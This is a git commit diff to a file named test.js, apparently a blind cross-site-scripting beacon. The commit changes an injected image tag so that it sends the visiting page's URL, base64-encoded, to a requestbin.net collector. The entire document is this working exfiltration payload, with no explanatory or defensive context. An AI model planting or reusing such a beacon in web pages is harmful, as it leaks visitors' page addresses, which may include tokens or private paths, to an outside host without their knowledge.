e985457c31257eb901c4fc0ac40ae5e1680e1b0b
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 17:28:22 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,3 +1,3 @@
 var img = document.createElement('img'); 
-img.src = 'http://requestbin.net/r/12ml0431'; 
+img.src = 'http://requestbin.net/r/12ml0431?link='+btoa(window.location.href); 
 document.body.appendChild(img);
